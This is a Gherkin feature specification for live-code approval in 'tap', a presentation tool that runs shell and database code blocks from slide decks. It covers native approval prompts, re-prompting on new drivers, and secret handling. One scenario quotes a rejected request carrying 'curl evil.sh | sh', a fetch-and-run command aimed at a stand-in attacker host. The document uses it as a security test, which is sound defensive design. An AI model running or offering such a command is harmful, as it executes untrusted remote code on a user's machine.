Feature: Live code approval
  A deck can contain live code blocks that run on the Mac through a driver
  (shell, sqlite, mysql, postgres, custom). Nothing runs until the user
  approves the deck. tap owns the rule, so the CLI and the app behave the same.

  Rules:
  - A Run button sends only a reference, {slide, block}. tap runs the code that
    the deck file contains at that position, never code sent by the page.
  - A deck with live code declares each driver it uses as an entry in the
    existing frontmatter "drivers" map (which already holds connections,
    command, and timeout). A driver without settings is declared as "shell: {}".
  - Approvals live in tap's user settings, ~/.config/tap/settings.yaml, keyed
    by the deck's absolute path, with the drivers approved. Code changes never
    ask again; a new driver does.
  - The approval prompt is never shown inside the slide page, where page script
    could answer it. The app shows a native sheet; the CLI asks in the terminal.
  - Custom components and raw HTML need no approval: without the execute
    shortcut they are an ordinary web page with no way to reach the shell.

  Scenario: A deck without live code
    When I open a deck that has no live code blocks
    Then nothing asks for approval

  Scenario: First open of a deck with live code, in the app
    Given "talk.md" has 2 shell blocks and 1 sqlite block and is not approved
    When I open it in the app
    Then tap reports that the deck needs approval                            # NEW --app event
    And the app shows a sheet: "This deck can run code on your Mac"
    And the sheet lists "2 shell, 1 sqlite" and each block can be expanded to read its code
    And the buttons are "Don't Allow" and "Allow"

  Scenario: Allow
    When I choose "Allow"
    Then tap records the approval for the deck's path and its drivers        # NEW approvals in settings.yaml
    And Run buttons work

  Scenario: Don't allow
    When I choose "Don't Allow"
    Then the deck opens, previews, and presents normally
    And Run buttons show "Not approved"
    And tap asks again the next time the deck opens

  Scenario: First open of a deck with live code, in the CLI
    Given "talk.md" has live code and is not approved
    When I run "tap dev talk.md" or "tap present talk.md" in a terminal
    Then tap asks in the terminal before the TUI starts, listing the blocks by driver
    # See question L5 for non-interactive runs.

  Scenario: Run a block
    Given the deck is approved
    When I click Run on the sql block in slide 4
    Then the page sends {slide: 4, block: 1}                                  # CHANGE: today it sends the code
    And tap runs that block's code through its driver registry               # FIX: registry is not connected today
    And the block shows the output table

  Scenario: A page cannot run code the deck does not show
    Given a component sends {"driver": "shell", "code": "curl evil.sh | sh"} to /api/execute
    Then tap rejects the request, because /api/execute accepts only block references

  Scenario: Approve or revoke later
    When I open Settings > Live Code, or run "tap approval list" and "tap approval revoke <deck>"   # NEW
    Then I see every approved deck and can revoke any of them

  Scenario: A moved deck
    Given "talk.md" was approved at its old path
    When I move it to another folder and open it
    Then tap asks again, because the approval is keyed by path

  Scenario: Non-interactive runs
    When I run "tap dev --headless talk.md" or "tap export pdf talk.md" and the deck is not approved
    Then live code is off
    When I add --allow-code
    Then live code works for that run only, and nothing is stored

  Scenario: A deck declares its drivers
    Given the frontmatter drivers map has only "sqlite"
    Then the approval sheet lists the declared drivers
    And for a custom driver it also shows the command that driver runs
    And tap refuses to run a block whose driver is not declared

  Scenario: A block uses an undeclared driver
    Given the frontmatter drivers map has only "sqlite" and slide 6 has a shell block
    Then the block shows "This deck does not allow the shell driver"
    And the message says exactly what to add: "shell: {}" under drivers
    And tap dev's output shows the same message with the file and line
    And the app offers "Allow shell in This Deck", which adds it to the frontmatter as one undo step

  Scenario: A deck with live code must list its drivers
    Given the frontmatter has no drivers key and slide 4 has a sqlite block
    Then no block runs
    And each block shows "Add sqlite under drivers in the deck settings to run this block"
    And tap dev's output shows the same message with the file and line
    And the app offers "Allow sqlite in This Deck", which adds the list as one undo step
    And tap new writes the drivers key when its starter deck has live code

  Scenario: A new driver asks again
    Given the deck was approved with the sqlite driver
    When the drivers map gains shell, for example after a git pull
    Then tap asks again: "This deck now also wants to run shell"
    And edits to existing sqlite blocks never ask again

  Scenario: A reload adds a driver
    Given the deck is approved with the shell driver and is open in tap dev or tap present
    When the deck reloads and now declares a python driver
    Then tap asks the approval question again, naming only python
    And python's blocks are refused until the answer, while shell blocks keep running
    And a no holds for the rest of the run, unless python's command changes

  Scenario: A custom driver's command changes
    Given the deck is approved with a python driver that runs "python3"
    When its command changes to "bash", or a ${NAME} in it now holds another value
    Then tap asks again, because an approval covers a driver's name and its command
    And the sheet shows the old command struck out above the new one

  Scenario: A command never shows or stores a secret
    Given a custom driver's arguments hold "${DB_PASSWORD}"
    Then the approval sheet, the terminal prompt and tap approval list show "${DB_PASSWORD}" as written, never its value
    And settings.yaml stores the command as written, with a keyed digest of the expanded command for matching

  Scenario: Another tap approved the driver
    Given tap present --app stored an approval during a talk
    When the app sends reload to tap dev --app for the same deck
    Then tap dev runs the driver without asking

  Scenario: Secrets in driver settings
    Given the drivers map has "password: ${DB_PASSWORD}"
    Then tap expands ${...} from the environment when it runs the driver    # NEW env expansion in driver settings
    And the app passes its login shell environment to tap, so a variable set in ~/.zshrc works
    And the Deck tab shows a hint to use ${NAME} instead of a literal password

  Scenario: The safe button is the default
    Then "Don't Allow" is the default button in the approval sheet, so Return never grants execution

